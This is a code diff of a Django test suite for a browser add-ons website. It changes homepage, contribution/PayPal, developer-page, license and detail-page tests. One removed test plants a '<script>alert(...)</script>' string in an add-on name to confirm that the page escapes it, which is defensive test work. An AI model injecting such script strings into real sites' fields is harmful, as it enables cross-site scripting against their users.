@@ -1,32 +1,35 @@
 # -*- coding: utf-8 -*-
-from cStringIO import StringIO
 from datetime import datetime
 from decimal import Decimal
 import json
 import re
-import urlparse
 
 from django import test
 from django.conf import settings
 from django.core import mail
 from django.core.cache import cache
+from django.test.client import Client
 from django.utils.encoding import iri_to_uri
 
+import fudge
 from mock import patch
-from nose.tools import eq_
-import test_utils
+from nose import SkipTest
+from nose.tools import eq_, nottest
 from pyquery import PyQuery as pq
+import waffle
 
 import amo
-from amo.helpers import absolutify
+import amo.tests
+from amo.helpers import absolutify, numberfmt, urlparams
+from amo.tests import addon_factory
 from amo.urlresolvers import reverse
-from amo.tests.test_helpers import AbuseBase
-from addons.models import Addon, AddonUser, Charity
+from abuse.models import AbuseReport
+from addons.models import Addon, AddonDependency, AddonUser, Charity
+from bandwagon.models import Collection
 from files.models import File
-from paypal.tests import other_error
+from paypal.tests.test import other_error
 from stats.models import Contribution
 from translations.helpers import truncate
-from translations.query import order_by_translation
 from users.helpers import users_list
 from users.models import UserProfile
 from versions.models import Version
@@ -37,41 +40,40 @@ def norm(s):
     return re.sub(r'[\s]+', ' ', str(s)).strip()
 
 
-class TestHomepage(test_utils.TestCase):
-    fixtures = ['base/apps',
-                'base/users',
-                'base/addon_3615',
-                'base/collections',
-                'base/global-stats',
-                'base/featured',
-                'base/collections',
-                'addons/featured',
-                'bandwagon/featured_collections']
+def add_addon_author(original, copy):
+    """Make both add-ons share an author."""
+    author = original.listed_authors[0]
+    AddonUser.objects.create(addon=copy, user=author, listed=True)
+    return author
+
+
+def check_cat_sidebar(url, addon):
+    """Ensures that the sidebar shows the categories for the correct type."""
+    cache.clear()
+    for type_ in [amo.ADDON_EXTENSION, amo.ADDON_THEME, amo.ADDON_SEARCH]:
+        addon.update(type=type_)
+        r = Client().get(url)
+        eq_(pq(r.content)('#side-nav').attr('data-addontype'), str(type_))
+
+
+@nottest
+def test_hovercards(self, doc, addons, src=''):
+    addons = list(addons)
+    eq_(doc.find('.addon.hovercard').length, len(addons))
+    for addon in addons:
+        btn = doc.find('.install[data-addon=%s]' % addon.id)
+        eq_(btn.length, 1)
+        hc = btn.parents('.addon.hovercard')
+        eq_(hc.find('a').attr('href'),
+            urlparams(addon.get_url_path(), src=src))
+        eq_(hc.find('h3').text(), unicode(addon.name))
+
+
+class TestHomepage(amo.tests.TestCase):
+    fixtures = ['base/apps']
 
     def setUp(self):
-        super(TestHomepage, self).setUp()
         self.base_url = reverse('home')
-        # Addon._feature keeps an in-process cache we need to clear.
-        if hasattr(Addon, '_feature'):
-            del Addon._feature
-
-    def test_promo_box_public_addons(self):
-        """Only public add-ons in the promobox."""
-        r = self.client.get(self.base_url, follow=True)
-        doc = pq(r.content)
-        assert doc('.addon-view .item').length > 0
-
-        Addon.objects.update(status=amo.STATUS_UNREVIEWED)
-        cache.clear()
-        r = self.client.get(self.base_url, follow=True)
-        doc = pq(r.content)
-        eq_(doc('.addon-view .item').length, 0)
-
-    def test_promo_box(self):
-        """Test that promobox features have proper translations."""
-        r = self.client.get(self.base_url, follow=True)
-        doc = pq(r.content)
-        eq_(doc('.lead a')[0].text, 'WebDev')
 
     def test_thunderbird(self):
         """Thunderbird homepage should have the Thunderbird title."""
@@ -79,44 +81,81 @@ class TestHomepage(test_utils.TestCase):
         doc = pq(r.content)
         eq_('Add-ons for Thunderbird', doc('title').text())
 
-    def test_default_feature(self):
-        response = self.client.get(self.base_url, follow=True)
-        eq_(response.status_code, 200)
-        eq_(response.context['filter'].field, 'featured')
+    def test_welcome_msg(self):
+        r = self.client.get('/en-US/firefox/')
+        welcome = pq(r.content)('#site-welcome').remove('a.close')
+        eq_(welcome.text(),
+            'Welcome to Firefox Add-ons. Choose from thousands of extra '
+            'features and styles to make Firefox your own.')
+        r = self.client.get('/en-US/thunderbird/')
+        welcome = pq(r.content)('#site-welcome').remove('a.close')
+        eq_(welcome.text(),
+            'Welcome to Thunderbird Add-ons. Add extra features and styles to '
+            'make Thunderbird your own.')
 
-    def test_featured(self):
-        response = self.client.get(self.base_url + '?browse=featured',
-                                   follow=True)
-        eq_(response.status_code, 200)
-        eq_(response.context['filter'].field, 'featured')
-        featured = response.context['addon_sets']['featured']
-        ids = [a.id for a in featured]
-        eq_(set(ids), set([2464, 7661]))
-        for addon in featured:
-            assert addon.is_featured(amo.FIREFOX, settings.LANGUAGE_CODE)
 
-    def _test_invalid_feature(self):
-        response = self.client.get(self.base_url + '?browse=xxx')
-        self.assertRedirects(response, '/en-US/firefox/', status_code=301)
+class TestHomepageFeatures(amo.tests.TestCase):
+    fixtures = ['base/apps',
+                'base/appversion',
+                'base/users',
+                'base/addon_3615',
+                'base/collections',
+                'base/global-stats',
+                'base/featured',
+                'addons/featured',
+                'bandwagon/featured_collections']
+
+    def setUp(self):
+        self.url = reverse('home')
 
     def test_no_unreviewed(self):
-        response = self.client.get(self.base_url)
-        for addons in response.context['addon_sets'].values():
-            for addon in addons:
+        response = self.client.get(self.url)
+        addon_lists = 'popular featured hotness personas'.split()
+        for key in addon_lists:
+            for addon in response.context[key]:
                 assert addon.status != amo.STATUS_UNREVIEWED
 
-    def test_filter_opts(self):
-        response = self.client.get(self.base_url)
-        opts = [k[0] for k in response.context['filter'].opts]
-        eq_(opts, 'featured popular new updated'.split())
+    def test_seeall(self):
+        Collection.objects.update(type=amo.COLLECTION_FEATURED)
+        doc = pq(self.client.get(self.url).content)
+        browse_extensions = reverse('browse.extensions')
+        browse_personas = reverse('browse.personas')
+        browse_collections = reverse('collections.list')
+        sections = {
+            '#popular-extensions': browse_extensions + '?sort=users',
+            '#featured-extensions': browse_extensions + '?sort=featured',
+            '#upandcoming': browse_extensions + '?sort=hotness',
+            '#featured-themes': browse_personas,
+            '#featured-collections': browse_collections + '?sort=featured',
+        }
+        for id_, url in sections.iteritems():
+            # Check that the "See All" link points to the correct page.
+            eq_(doc.find('%s .seeall' % id_).attr('href'), url)
 
-    def test_added_date(self):
-        doc = pq(self.client.get(self.base_url).content)
-        s = doc('#list-new .item .updated').text()
-        assert s.strip().startswith('Added'), s
+    @amo.tests.mobile_test
+    def test_mobile_home_extensions_only(self):
+        r = self.client.get(self.url)
+        addons = r.context['featured'] + r.context['popular']
+        assert all([a.type == amo.ADDON_EXTENSION for a in addons]), (
+            'Expected only extensions to be listed on mobile homepage')
+
+    @amo.tests.mobile_test
+    def test_mobile_home_featured(self):
+        r = self.client.get(self.url)
+        featured = r.context['featured']
+        assert all([a.is_featured(amo.FIREFOX, 'en-US') for a in featured]), (
+            'Expected only featured extensions to be listed under Featured')
+
+    @amo.tests.mobile_test
+    def test_mobile_home_popular(self):
+        r = self.client.get(self.url)
+        popular = r.context['popular']
+        eq_([a.id for a in popular],
+            [a.id for a in sorted(popular, key=lambda x: x.average_daily_users,
+                                  reverse=True)])
 
 
-class TestPromobox(test_utils.TestCase):
+class TestPromobox(amo.tests.TestCase):
     fixtures = ['addons/ptbr-promobox']
 
     def test_promo_box_ptbr(self):
@@ -125,13 +164,16 @@ class TestPromobox(test_utils.TestCase):
         eq_(response.status_code, 200)
 
 
-class TestContributeInstalled(test_utils.TestCase):
-    fixtures = ['base/apps', 'base/addon_592']
+class TestContributeInstalled(amo.tests.TestCase):
+    fixtures = ['base/apps', 'base/appversion', 'base/addon_592']
+
+    def setUp(self):
+        self.addon = Addon.objects.get(pk=592)
+        self.url = reverse('addons.installed', args=['a592'])
 
     def test_no_header_block(self):
         # bug 565493, Port post-install contributions page
-        response = self.client.get(reverse('addons.installed', args=['a592']),
-                                   follow=True)
+        response = self.client.get(self.url, follow=True)
         doc = pq(response.content)
         header = doc('#header')
         aux_header = doc('#aux-nav')
@@ -139,36 +181,57 @@ class TestContributeInstalled(test_utils.TestCase):
         eq_(header, [])
         eq_(aux_header, [])
 
+    def test_num_addons_link(self):
+        r = self.client.get(self.url)
+        a = pq(r.content)('.num-addons a')
+        eq_(a.length, 1)
+        author = self.addon.authors.all()[0]
+        eq_(a.attr('href'), author.get_url_path())
+
     def test_title(self):
-        r = self.client.get(reverse('addons.installed', args=['a592']))
+        r = self.client.get(self.url)
         title = pq(r.content)('title').text()
-        eq_(title[:37], 'Thank you for installing Gmail S/MIME')
+        eq_(title.startswith('Thank you for installing Gmail S/MIME'), True)
 
 
-class TestContributeEmbedded(test_utils.TestCase):
-    fixtures = ['base/apps', 'base/addon_3615', 'base/addon_592']
+class TestContributeEmbedded(amo.tests.TestCase):
+    fixtures = ['base/addon_3615', 'base/addon_592', 'base/users']
 
     def setUp(self):
-        settings.PAYPAL_USE_EMBEDDED = True
         self.addon = Addon.objects.get(pk=592)
-        self.detail_url = reverse('addons.detail', args=[self.addon.slug])
+        self.detail_url = self.addon.get_url_path()
 
     @patch('paypal.get_paykey')
-    def client_get(self, get_paykey, **kwargs):
-        get_paykey.return_value = 'abc'
+    def client_post(self, get_paykey, **kwargs):
+        get_paykey.return_value = ['abc', '']
         url = reverse('addons.contribute', args=kwargs.pop('rev'))
         if 'qs' in kwargs:
             url = url + kwargs.pop('qs')
-        return self.client.get(url, kwargs.get('data', {}))
+        return self.client.post(url, kwargs.get('data', {}))
+
+    def test_client_get(self):
+        url = reverse('addons.contribute', args=[self.addon.slug])
+        eq_(self.client.get(url, {}).status_code, 405)
 
     def test_invalid_is_404(self):
         """we get a 404 in case of invalid addon id"""
-        response = self.client_get(rev=[1])
+        response = self.client_post(rev=[1])
         eq_(response.status_code, 404)
+
+    @fudge.patch('paypal.get_paykey')
+    def test_charity_name(self, get_paykey):
+        (get_paykey.expects_call()
+                   .with_matching_args(memo=u'Contribution for foë: foë')
+                   .returns(('payKey', 'paymentExecStatus')))
+        self.addon.charity = Charity.objects.create(name=u'foë')
+        self.addon.name = u'foë'
+        self.addon.save()
+        url = reverse('addons.contribute', args=['a592'])
+        self.client.post(url)
 
     def test_params_common(self):
         """Test for the some of the common values"""
-        response = self.client_get(rev=['a592'])
+        response = self.client_post(rev=['a592'])
         eq_(response.status_code, 302)
         con = Contribution.objects.all()[0]
         eq_(con.charity_id, None)
@@ -177,23 +240,30 @@ class TestContributeEmbedded(test_utils.TestCase):
 
     def test_custom_amount(self):
         """Test that we have the custom amount when given."""
-        request_params = '?type=onetime&onetime-amount=42'
-        response = self.client_get(rev=['a592'], qs=request_params)
+        response = self.client_post(rev=['a592'], data={'onetime-amount': 42,
+                                                        'type': 'onetime'})
         eq_(response.status_code, 302)
         eq_(Contribution.objects.all()[0].amount, Decimal('42.00'))
 
+    def test_invalid_amount(self):
+        response = self.client_post(rev=['a592'], data={'onetime-amount': 'f',
+                                                        'type': 'onetime'})
+        data = json.loads(response.content)
+        eq_(data['paykey'], '')
+        eq_(data['error'], 'Invalid data.')
+
     def test_ppal_json_switch(self):
-        response = self.client_get(rev=['a592'], qs='?result_type=json')
+        response = self.client_post(rev=['a592'], qs='?result_type=json')
         eq_(response.status_code, 200)
-        response = self.client_get(rev=['a592'])
+        response = self.client_post(rev=['a592'])
         eq_(response.status_code, 302)
 
     def test_ppal_return_url_not_relative(self):
-        response = self.client_get(rev=['a592'], qs='?result_type=json')
+        response = self.client_post(rev=['a592'], qs='?result_type=json')
         assert json.loads(response.content)['url'].startswith('http')
 
     def test_unicode_comment(self):
-        res = self.client_get(rev=['a592'],
+        res = self.client_post(rev=['a592'],
                             data={'comment': u'版本历史记录'})
         eq_(res.status_code, 302)
         assert settings.PAYPAL_FLOW_URL in res._headers['location'][1]
@@ -204,19 +274,19 @@ class TestContributeEmbedded(test_utils.TestCase):
                                    paypal='test@moz.com')
         self.addon.update(charity=c)
 
-        r = self.client_get(rev=['a592'])
+        r = self.client_post(rev=['a592'])
         eq_(r.status_code, 302)
         eq_(self.addon.charity_id,
             self.addon.contribution_set.all()[0].charity_id)
 
     def test_no_org(self):
-        r = self.client_get(rev=['a592'])
+        r = self.client_post(rev=['a592'])
         eq_(r.status_code, 302)
         eq_(self.addon.contribution_set.all()[0].charity_id, None)
 
     def test_no_suggested_amount(self):
         self.addon.update(suggested_amount=None)
-        res = self.client_get(rev=['a592'])
+        res = self.client_post(rev=['a592'])
         eq_(res.status_code, 302)
         eq_(settings.DEFAULT_SUGGESTED_CONTRIBUTION,
             self.addon.contribution_set.all()[0].amount)
@@ -224,177 +294,51 @@ class TestContributeEmbedded(test_utils.TestCase):
     def test_form_suggested_amount(self):
         res = self.client.get(self.detail_url)
         doc = pq(res.content)
-        eq_(len(doc('#contribute-box input')), 4)
+        eq_(len(doc('#contribute-box input[type=radio]')), 2)
 
     def test_form_no_suggested_amount(self):
         self.addon.update(suggested_amount=None)
         res = self.client.get(self.detail_url)
         doc = pq(res.content)
-        eq_(len(doc('#contribute-box input')), 3)
+        eq_(len(doc('#contribute-box input[type=radio]')), 1)
 
-    @patch('paypal.get_paykey')
+    @fudge.patch('paypal.get_paykey')
     def test_paypal_error_json(self, get_paykey, **kwargs):
-        get_paykey.return_value = None
-        res = self.client.get('%s?%s' % (
-                        reverse('addons.contribute', args=[self.addon.slug]),
-                        'result_type=json'))
+        get_paykey.expects_call().returns((None, None))
+        res = self.contribute()
         assert not json.loads(res.content)['paykey']
 
-    @patch('urllib2.OpenerDirector.open')
-    def test_paypal_other_error_json(self, opener, **kwargs):
-        opener.return_value = StringIO(other_error)
-        res = self.client.get('%s?%s' % (
-                        reverse('addons.contribute', args=[self.addon.slug]),
-                        'result_type=json'))
+    @patch('paypal.requests.post')
+    def test_paypal_other_error_json(self, post, **kwargs):
+        post.return_value.text = other_error
+        res = self.contribute()
         assert not json.loads(res.content)['paykey']
 
+    def _test_result_page(self):
+        url = self.addon.get_detail_url('paypal', ['complete'])
+        doc = pq(self.client.get(url, {'uuid': 'ballin'}).content)
+        eq_(doc('#paypal-result').length, 1)
+        eq_(doc('#paypal-thanks').length, 0)
 
-class TestContribute(test_utils.TestCase):
-    fixtures = ['base/apps', 'base/addon_3615', 'base/addon_592']
+    def test_addons_result_page(self):
+        self._test_result_page()
 
-    def setUp(self):
-        settings.PAYPAL_USE_EMBEDDED = False
+    @fudge.patch('paypal.get_paykey')
+    def test_not_split(self, get_paykey):
+        def check_call(*args, **kw):
+            assert 'chains' not in kw
+        (get_paykey.expects_call()
+                   .calls(check_call)
+                   .returns(('payKey', 'paymentExecStatus')))
+        self.contribute()
 
-    def test_invalid_is_404(self):
-        """we get a 404 in case of invalid addon id"""
-        response = self.client.get(reverse('addons.contribute', args=[1]))
-        eq_(response.status_code, 404)
-
-    def test_redirect_params_no_type(self):
-        """Test that we have the required ppal params when no type is given"""
-        response = self.client.get(reverse('addons.contribute',
-                                           args=['a592']), follow=True)
-        redirect_url = response.redirect_chain[0][0]
-        required_params = ['bn', 'business', 'charset', 'cmd', 'item_name',
-                           'no_shipping', 'notify_url',
-                           'return', 'item_number']
-        for param in required_params:
-            assert(redirect_url.find(param + '=') > -1), \
-                   "param [%s] not found" % param
-
-    def test_redirect_params_common(self):
-        """Test for the common values that do not change based on type,
-           Check that they have expected values"""
-        response = self.client.get(reverse('addons.contribute',
-                                           args=['a592']), follow=True)
-        redirect_url = response.redirect_chain[0][0]
-        assert(re.search('business=([^&]+)', redirect_url))
-        common_params = {'bn': r'-AddonID592',
-                         'business': r'gmailsmime%40seantek.com',
-                         'charset': r'utf-8',
-                         'cmd': r'_donations',
-                         'item_name': r'Contribution\+for\+Gmail\+S%2FMIME',
-                         'no_shipping': r'1',
-                         'notify_url': r'%2Fservices%2Fpaypal',
-                         'return': r'x',
-                         'item_number': r'[a-f\d]{32}'}
-
-        message = 'param [%s] unexpected value: given [%s], ' \
-                  + 'expected pattern [%s]'
-        for param, value_pattern in common_params.items():
-            match = re.search(r'%s=([^&]+)' % param, redirect_url)
-            assert(match and re.search(value_pattern, match.group(1))), \
-                  message % (param, match.group(1), value_pattern)
-
-    def test_redirect_params_type_suggested(self):
-        """Test that we have the required ppal param when type
-           suggested is given"""
-        request_params = '?type=suggested'
-        response = self.client.get(reverse('addons.contribute',
-                                           args=['a592']) + request_params,
-                                           follow=True)
-        redirect_url = response.redirect_chain[0][0]
-        required_params = ['amount', 'bn', 'business', 'charset',
-                           'cmd', 'item_name', 'no_shipping', 'notify_url',
-                           'return', 'item_number']
-        for param in required_params:
-            assert(redirect_url.find(param + '=') > -1), \
-                   "param [%s] not found" % param
-
-    def test_redirect_params_type_onetime(self):
-        """Test that we have the required ppal param when
-           type onetime is given"""
-        request_params = '?type=onetime&onetime-amount=42'
-        response = self.client.get(reverse('addons.contribute',
-                                           args=['a592']) + request_params,
-                                           follow=True)
-        redirect_url = response.redirect_chain[0][0]
-        required_params = ['amount', 'bn', 'business', 'charset', 'cmd',
-                           'item_name', 'no_shipping', 'notify_url',
-                           'return', 'item_number']
-        for param in required_params:
-            assert(redirect_url.find(param + '=') > -1), \
-                   "param [%s] not found" % param
-
-        assert(redirect_url.find('amount=42') > -1)
-
-    def test_ppal_return_url_not_relative(self):
-        response = self.client.get(reverse('addons.contribute',
-                                           args=['a592']), follow=True)
-        redirect_url = response.redirect_chain[0][0]
-
-        assert(re.search('\?|&return=https?%3A%2F%2F', redirect_url)), \
-               ("return URL param did not start w/ "
-                "http%3A%2F%2F (http://) [%s]" % redirect_url)
-
-    def test_redirect_params_type_monthly(self):
-        """Test that we have the required ppal param when
-           type monthly is given"""
-        request_params = '?type=monthly&monthly-amount=42'
-        response = self.client.get(reverse('addons.contribute',
-                                           args=['a592']) + request_params,
-                                           follow=True)
-        redirect_url = response.redirect_chain[0][0]
-        required_params = ['no_note', 'a3', 't3', 'p3', 'bn', 'business',
-                           'charset', 'cmd', 'item_name', 'no_shipping',
-                           'notify_url', 'return', 'item_number']
-        for param in required_params:
-            assert(redirect_url.find(param + '=') > -1), \
-                   "param [%s] not found" % param
-
-        assert(redirect_url.find('cmd=_xclick-subscriptions') > -1), \
-              'param a3 was not 42'
-        assert(redirect_url.find('p3=12') > -1), 'param p3 was not 12'
-        assert(redirect_url.find('t3=M') > -1), 'param t3 was not M'
-        assert(redirect_url.find('a3=42') > -1), 'param a3 was not 42'
-        assert(redirect_url.find('no_note=1') > -1), 'param no_note was not 1'
-
-    def test_paypal_bounce(self):
-        """Paypal is retarded and posts to this page."""
-        args = dict(args=['a3615'])
-        r = self.client.post(reverse('addons.thanks', **args))
-        self.assertRedirects(r, reverse('addons.detail', **args))
-
-    def test_unicode_comment(self):
-        r = self.client.get(reverse('addons.contribute', args=['a592']),
-                            {'comment': u'版本历史记录'})
-        eq_(r.status_code, 302)
-        assert r['Location'].startswith(settings.PAYPAL_CGI_URL)
-
-    def test_organization(self):
-        c = Charity.objects.create(name='moz', url='moz.com', paypal='mozcom')
-        addon = Addon.objects.get(id=592)
-        addon.update(charity=c)
-
-        r = self.client.get(reverse('addons.contribute', args=['a592']))
-        eq_(r.status_code, 302)
-        qs = dict(urlparse.parse_qsl(r['Location']))
-        eq_(qs['item_name'], 'Contribution for moz')
-        eq_(qs['business'], 'mozcom')
-
-        contrib = Contribution.objects.get(addon=addon)
-        eq_(addon.charity_id, contrib.charity_id)
-
-    def test_no_org(self):
-        addon = Addon.objects.get(id=592)
-        r = self.client.get(reverse('addons.contribute', args=['a592']))
-        eq_(r.status_code, 302)
-        contrib = Contribution.objects.get(addon=addon)
-        eq_(contrib.charity_id, None)
+    def contribute(self):
+        url = reverse('addons.contribute', args=[self.addon.slug])
+        return self.client.post(urlparams(url, result_type='json'))
 
 
-class TestDeveloperPages(test_utils.TestCase):
-    fixtures = ['base/apps', 'base/addon_3615', 'base/addon_592',
+class TestDeveloperPages(amo.tests.TestCase):
+    fixtures = ['base/addon_3615', 'base/addon_592', 'base/apps',
                 'base/users', 'addons/eula+contrib-addon',
                 'addons/addon_228106_info+dev+bio.json',
                 'addons/addon_228107_multiple-devs.json']
@@ -402,28 +346,28 @@ class TestDeveloperPages(test_utils.TestCase):
     def test_meet_the_dev_title(self):
         r = self.client.get(reverse('addons.meet', args=['a592']))
         title = pq(r.content)('title').text()
-        eq_(title[:31], 'Meet the Gmail S/MIME Developer')
+        eq_(title.startswith('Meet the Gmail S/MIME Developer'), True)
 
     def test_roadblock_title(self):
         r = self.client.get(reverse('addons.meet', args=['a592']))
         title = pq(r.content)('title').text()
-        eq_(title[:31], 'Meet the Gmail S/MIME Developer')
+        eq_(title.startswith('Meet the Gmail S/MIME Developer'), True)
 
     def test_meet_the_dev_src(self):
         r = self.client.get(reverse('addons.meet', args=['a11730']))
         button = pq(r.content)('.install-button a.button').attr('href')
-        assert button.endswith('?src=meet-developers'), button
+        eq_(button.endswith('?src=developers'), True)
 
     def test_nl2br_info(self):
         r = self.client.get(reverse('addons.meet', args=['a228106']))
         eq_(r.status_code, 200)
         doc = pq(r.content)
-        author_parts = [pq(p).html() for p in doc('.addon-info p')]
-        eq_(author_parts[0],
+        eq_(doc('.bio').html(),
             'Bio: This is line one.<br/><br/>This is line two')
-        eq_(author_parts[1],
+        addon_reasons = doc('#about-addon p')
+        eq_(addon_reasons.eq(0).html(),
             'Why: This is line one.<br/><br/>This is line two')
-        eq_(author_parts[2],
+        eq_(addon_reasons.eq(1).html(),
             'Future: This is line one.<br/><br/>This is line two')
 
     def test_nl2br_info_for_multiple_devs(self):
@@ -431,49 +375,38 @@ class TestDeveloperPages(test_utils.TestCase):
         # which will trigger the else block in the template.
         r = self.client.get(reverse('addons.meet', args=['a228107']))
         eq_(r.status_code, 200)
-        doc = pq(r.content)
-        author_parts = [pq(p).html() for p in doc('.addon-author-info p')]
-        eq_(author_parts[0],
+        bios = pq(r.content)('.bio')
+        eq_(bios.eq(0).html(),
             'Bio1: This is line one.<br/><br/>This is line two')
-        eq_(author_parts[1],
+        eq_(bios.eq(1).html(),
             'Bio2: This is line one.<br/><br/>This is line two')
 
-        info_parts = [pq(p).html() for p in doc('.addon-info p')]
-        eq_(info_parts[0],
-            'Why: This is line one.<br/><br/>This is line two')
-        eq_(info_parts[1],
-            'Future: This is line one.<br/><br/>This is line two')
-
     def test_roadblock_src(self):
+        url = reverse('addons.roadblock', args=['a11730'])
         # If they end up at the roadblock we force roadblock on them
-        url = reverse('addons.roadblock', args=['a11730']) + '?src=addondetail'
-        r = self.client.get(url)
+        r = self.client.get(url + '?src=dp-btn-primary')
         button = pq(r.content)('.install-button a.button').attr('href')
-        assert button.endswith('?src=addondetail'), button
+        eq_(button.endswith('?src=dp-btn-primary'), True)
 
         # No previous source gets the roadblock page source
-        url = reverse('addons.roadblock', args=['a11730'])
         r = self.client.get(url)
         button = pq(r.content)('.install-button a.button').attr('href')
-        assert button.endswith('?src=roadblock'), button
+        eq_(button.endswith('?src=meetthedeveloper_roadblock'), True)
 
     def test_roadblock_different(self):
-        url = reverse('addons.roadblock', args=['a11730']) + '?src=addondetail'
-        r = self.client.get(url)
+        url = reverse('addons.roadblock', args=['a11730'])
+        r = self.client.get(url + '?src=dp-btn-primary')
         button = pq(r.content)('.install-button a.button').attr('href')
-        assert button.endswith('?src=addondetail'), button
-
-        contribute = pq(r.content)('#contribute-button').attr('href')
-        assert contribute.endswith('?src=roadblock'), button
+        eq_(button.endswith('?src=dp-btn-primary'), True)
+        eq_(pq(r.content)('#contribute-box input[name=source]').val(),
+            'roadblock')
 
     def test_contribute_multiple_devs(self):
         a = Addon.objects.get(pk=592)
         u = UserProfile.objects.get(pk=999)
         AddonUser(addon=a, user=u).save()
         r = self.client.get(reverse('addons.meet', args=['a592']))
-        # Make sure it has multiple devs.
-        assert pq(r.content)('.section-teaser')
-        assert pq(r.content)('#contribute-button')
+        eq_(pq(r.content)('#contribute-button').length, 1)
 
     def test_get_old_version(self):
         url = reverse('addons.meet', args=['a11730'])
@@ -496,12 +429,12 @@ class TestDeveloperPages(test_utils.TestCase):
         addon.the_reason = addon.the_future = '<b>foo</b>'
         addon.save()
         url = reverse('addons.meet', args=['592'])
-        res = self.client.get(url, follow=True)
-        eq_(len(pq(res.content)('div.addon-info b')), 2)
+        r = self.client.get(url, follow=True)
+        eq_(pq(r.content)('#about-addon b').length, 2)
 
 
-class TestLicensePage(test_utils.TestCase):
-    fixtures = ['base/apps', 'base/addon_3615']
+class TestLicensePage(amo.tests.TestCase):
+    fixtures = ['base/addon_3615']
 
     def setUp(self):
         self.addon = Addon.objects.get(id=3615)
@@ -543,8 +476,12 @@ class TestLicensePage(test_utils.TestCase):
         eq_(r.status_code, 200)
         eq_(r.context['version'], self.addon.current_version)
 
+    def test_cat_sidebar(self):
+        check_cat_sidebar(reverse('addons.license', args=['a3615']),
+                          self.addon)
 
-class TestDetailPage(test_utils.TestCase):
+
+class TestDetailPage(amo.tests.TestCase):
     fixtures = ['base/apps',
                 'base/addon_3615',
                 'base/users',
@@ -553,26 +490,29 @@ class TestDetailPage(test_utils.TestCase):
                 'addons/listed',
                 'addons/persona']
 
+    def setUp(self):
+        self.addon = Addon.objects.get(id=3615)
+        self.url = self.addon.get_url_path()
+
+    def test_site_title(self):
+        r = self.client.get(self.url)
+        eq_(pq(r.content)('h1.site-title').text(), 'Add-ons')
+
+    def test_addon_headings(self):
+        r = self.client.get(self.url)
+        doc = pq(r.content)
+        eq_(doc('h2:first').text(), 'About this Add-on')
+        eq_(doc('.metadata .home').text(), 'Add-on home page')
+
     def test_anonymous_extension(self):
-        response = self.client.get(reverse('addons.detail', args=['a3615']),
-                                   follow=True)
+        response = self.client.get(self.url)
         eq_(response.status_code, 200)
         eq_(response.context['addon'].id, 3615)
 
     def test_anonymous_persona(self):
-        response = self.client.get(reverse('addons.detail', args=['a15663']),
-                                   follow=True)
+        response = self.client.get(reverse('addons.detail', args=['a15663']))
         eq_(response.status_code, 200)
         eq_(response.context['addon'].id, 15663)
-
-    def test_review_microdata_extension(self):
-        a = Addon.objects.get(id=3615)
-        a.name = '<script>alert("fff")</script>'
-        a.save()
-        response = self.client.get(reverse('addons.detail', args=['a3615']))
-        html = pq(response.content)('table caption').html()
-        assert '&lt;script&gt;alert("fff")&lt;/script&gt;' in html
-        assert '<script>' not in html
 
     def test_review_microdata_personas(self):
         a = Addon.objects.get(id=15663)
@@ -591,11 +531,10 @@ class TestDetailPage(test_utils.TestCase):
 
     def test_unreviewed_robots(self):
         """Check that unreviewed add-ons do not get indexed."""
-        addon = Addon.objects.get(id=3615)
-        url = reverse('addons.detail', args=['a3615'])
+        url = self.addon.get_url_path()
         m = 'meta[content=noindex]'
 
-        eq_(addon.status, amo.STATUS_PUBLIC)
+        eq_(self.addon.status, amo.STATUS_PUBLIC)
         settings.ENGAGE_ROBOTS = True
         doc = pq(self.client.get(url).content)
         assert not doc(m)
@@ -603,7 +542,7 @@ class TestDetailPage(test_utils.TestCase):
         doc = pq(self.client.get(url).content)
         assert doc(m)
 
-        addon.update(status=amo.STATUS_UNREVIEWED)
+        self.addon.update(status=amo.STATUS_UNREVIEWED)
         settings.ENGAGE_ROBOTS = False
         doc = pq(self.client.get(url).content)
         assert doc(m)
@@ -611,28 +550,14 @@ class TestDetailPage(test_utils.TestCase):
         doc = pq(self.client.get(url).content)
         assert doc(m)
 
-    def test_listed(self):
-        """Show certain things for hosted but not listed add-ons."""
-        hosted_resp = self.client.get(reverse('addons.detail', args=['a3615']),
-                                      follow=True)
-        hosted = pq(hosted_resp.content)
-
-        listed_resp = self.client.get(reverse('addons.detail', args=['a3723']),
-                                      follow=True)
-        listed = pq(listed_resp.content)
-
-        eq_(hosted('#releasenotes').length, 1)
-        eq_(listed('#releasenotes').length, 0)
-
     def test_more_about(self):
         # Don't show more about box if there's nothing to populate it.
-        addon = Addon.objects.get(id=3615)
-        addon.developer_comments_id = None
-        addon.description_id = None
-        addon.previews.all().delete()
-        addon.save()
+        self.addon.developer_comments_id = None
+        self.addon.description_id = None
+        self.addon.previews.all().delete()
+        self.addon.save()
 
-        r = self.client.get(reverse('addons.detail', args=['a3615']))
+        r = self.client.get(self.url)
         doc = pq(r.content)
 
         eq_(doc('#more-about').length, 0)
@@ -640,56 +565,42 @@ class TestDetailPage(test_utils.TestCase):
 
     def test_beta(self):
         """Test add-on with a beta channel."""
-        my_addonid = 3615
-        get_pq_content = lambda: pq(self.client.get(reverse(
-            'addons.detail', args=[my_addonid]), follow=True).content)
-
-        myaddon = Addon.objects.get(id=my_addonid)
+        get_pq_content = lambda: pq(
+            self.client.get(self.url, follow=True).content)
 
         # Add a beta version and show it.
-        mybetafile = myaddon.versions.all()[0].files.all()[0]
+        mybetafile = self.addon.versions.all()[0].files.all()[0]
         mybetafile.status = amo.STATUS_BETA
         mybetafile.save()
-        myaddon.update(status=amo.STATUS_PUBLIC)
+        self.addon.update(status=amo.STATUS_PUBLIC)
         beta = get_pq_content()
         eq_(beta('#beta-channel').length, 1)
 
         # Now hide it.  Beta is only shown for STATUS_PUBLIC.
-        myaddon.update(status=amo.STATUS_UNREVIEWED)
+        self.addon.update(status=amo.STATUS_UNREVIEWED)
         beta = get_pq_content()
         eq_(beta('#beta-channel').length, 0)
 
-    def test_other_addons(self):
-        """Test "other add-ons by author" list."""
-
-        # Grab a user and give them some add-ons.
-        u = UserProfile.objects.get(pk=55021)
-        thisaddon = u.addons.all()[0]
-        qs = Addon.objects.valid().exclude(pk=thisaddon.pk)
-        other_addons = order_by_translation(qs, 'name')[:3]
-        for addon in other_addons:
-            AddonUser.objects.create(user=u, addon=addon)
-
-        page = self.client.get(reverse('addons.detail', args=[thisaddon.slug]),
-                               follow=True)
-        doc = pq(page.content)
-        eq_(doc('.other-author-addons li').length, other_addons.count())
-        for i in range(other_addons.count()):
-            link = doc('.other-author-addons li a').eq(i)
-            eq_(link.attr('href'), other_addons[i].get_url_path())
+    @amo.tests.mobile_test
+    def test_unreviewed_disabled_button(self):
+        self.addon.update(status=amo.STATUS_UNREVIEWED)
+        r = self.client.get(self.url)
+        doc = pq(r.content)
